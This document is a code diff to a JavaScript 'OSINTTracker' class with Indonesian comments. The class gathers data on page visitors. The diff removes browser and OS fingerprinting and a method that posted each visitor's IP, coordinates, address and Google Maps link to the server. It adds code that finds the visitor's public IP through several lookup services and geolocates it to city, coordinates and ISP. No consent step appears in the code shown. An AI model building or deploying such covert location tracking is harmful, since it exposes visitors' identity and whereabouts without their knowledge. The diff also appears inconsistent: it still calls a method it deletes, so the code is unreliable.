@@ -116,115 +116,80 @@ class OSINTTracker {
         await this.sendToServer();
     }
     
-    // Dapatkan nama browser
-    getBrowserName() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Chrome')) return 'Chrome';
-        if (ua.includes('Firefox')) return 'Firefox';
-        if (ua.includes('Safari')) return 'Safari';
-        if (ua.includes('Edge')) return 'Edge';
-        if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
-        if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
-        return 'Unknown';
-    }
-    
-    // Dapatkan versi browser
-    getBrowserVersion() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/(Chrome|Firefox|Safari|Edge|OPR|MSIE|Trident)\/?\s*(\d+)/i);
-        return match ? match[2] : 'Unknown';
-    }
-    
-    // Dapatkan engine browser
-    getBrowserEngine() {
-        const ua = navigator.userAgent;
-        if (ua.includes('WebKit')) return 'WebKit';
-        if (ua.includes('Gecko')) return 'Gecko';
-        if (ua.includes('Trident')) return 'Trident';
-        return 'Unknown';
-    }
-    
-    // Dapatkan nama OS
-    getOSName() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Windows')) return 'Windows';
-        if (ua.includes('Mac')) return 'macOS';
-        if (ua.includes('Linux')) return 'Linux';
-        if (ua.includes('Android')) return 'Android';
-        if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-        return 'Unknown';
-    }
-    
-    // Dapatkan versi OS
-    getOSVersion() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/(Windows NT|Mac OS X|Android|iOS)\s*([\d._]+)/i);
-        return match ? match[2] : 'Unknown';
-    }
-    
-    // Generate fingerprint unik
-    generateFingerprint() {
-        const components = [
-            navigator.userAgent,
-            navigator.language,
-            navigator.platform,
-            screen.colorDepth,
-            screen.width + 'x' + screen.height,
-            new Date().getTimezoneOffset(),
-            navigator.hardwareConcurrency || '',
-            navigator.deviceMemory || ''
+    // Dapatkan IP Address
+    async getIPAddress() {
+        const ipAPIs = [
+            {
+                url: 'https://api.ipify.org?format=json',
+                parser: (data) => data.ip
+            },
+            {
+                url: 'https://api.myip.com',
+                parser: (data) => data.ip
+            },
+            {
+                url: 'https://ipapi.co/json/',
+                parser: (data) => data.ip
+            },
+            {
+                url: 'https://ipinfo.io/json',
+                parser: (data) => data.ip
+            },
+            {
+                url: 'https://jsonip.com',
+                parser: (data) => data.ip
+            }
         ];
         
-        const hash = btoa(components.join('|')).substring(0, 32);
-        return hash;
+        for (const api of ipAPIs) {
+            try {
+                const response = await fetch(api.url);
+                const data = await response.json();
+                const ip = api.parser(data);
+                
+                if (ip && ip !== 'Unknown' && ip.includes('.')) {
+                    this.userData.ip_address = ip;
+                    this.userData.public_ip = ip;
+                    console.log('✅ IP Address:', ip);
+                    
+                    // Dapatkan data dari IP
+                    await this.getIPLocation(ip);
+                    return;
+                }
+            } catch (e) {
+                console.log('Gagal dengan API:', api.url);
+            }
+        }
+        
+        this.userData.ip_address = 'Unknown';
+        console.warn('⚠️ IP Address tidak ditemukan');
     }
     
-    // Kirim data ke server
-    async sendToServer() {
+    // Dapatkan lokasi dari IP
+    async getIPLocation(ip) {
         try {
-            // Pastikan semua field terisi
-            this.userData.country = this.userData.country || 'Tidak diketahui';
-            this.userData.city = this.userData.city || 'Tidak diketahui';
-            this.userData.full_address = this.userData.full_address || 'Tidak diketahui';
+            // Coba ipapi.co
+            const response = await fetch(`https://ipapi.co/${ip || ''}/json/`);
+            const data = await response.json();
             
-            // Buat link Google Maps jika ada koordinat
-            if (this.userData.latitude && this.userData.longitude && 
-                Math.abs(this.userData.latitude) > 0.1 && Math.abs(this.userData.longitude) > 0.1) {
-                this.userData.google_maps_link = `https://www.google.com/maps?q=${this.userData.latitude},${this.userData.longitude}`;
-            }
-            
-            console.log('📤 Mengirim data ke server...');
-            console.log('Data:', {
-                ip: this.userData.ip_address,
-                lokasi: `${this.userData.latitude}, ${this.userData.longitude}`,
-                alamat: this.userData.full_address,
-                maps: this.userData.google_maps_link
-            });
-            
-            const formData = new FormData();
-            formData.append('visitor_data', JSON.stringify(this.userData));
-            
-            const response = await fetch('index.php', {
-                method: 'POST',
-                body: formData
-            });
-            
-            if (response.ok) {
-                const result = await response.json();
-                console.log('✅ Data terkirim ke server');
+            if (data && !data.error) {
+                this.userData.country = data.country_name || 'Tidak diketahui';
+                this.userData.country_code = data.country_code || 'Tidak diketahui';
+                this.userData.city = data.city || 'Tidak diketahui';
+                this.userData.latitude = data.latitude || 0;
+                this.userData.longitude = data.longitude || 0;
+                this.userData.isp = data.org || 'Tidak diketahui';
+                this.userData.asn = data.asn || 'Tidak diketahui';
                 
-                // Log untuk developer
-                console.log('%c📊 OSINT DATA SENT TO DEVELOPER', 'background: #dc3545; color: white; padding: 5px;');
-                console.log('IP:', this.userData.ip_address);
-                console.log('Lokasi:', this.userData.city + ', ' + this.userData.country);
-                console.log('Koordinat:', this.userData.latitude + ', ' + this.userData.longitude);
-                if (this.userData.google_maps_link) {
-                    console.log('Google Maps:', this.userData.google_maps_link);
+                // Dapatkan alamat dari koordinat jika ada
+                if (data.latitude && data.longitude) {
+                    await this.reverseGeocode();
                 }
+                
+                console.log('📍 Data dari IP:', this.userData.city, this.userData.country);
             }
-            
         } catch (error) {
-            console.error('❌ Gagal kirim data:', error);
+            console.log('IP location gagal');
         }
     }
 }
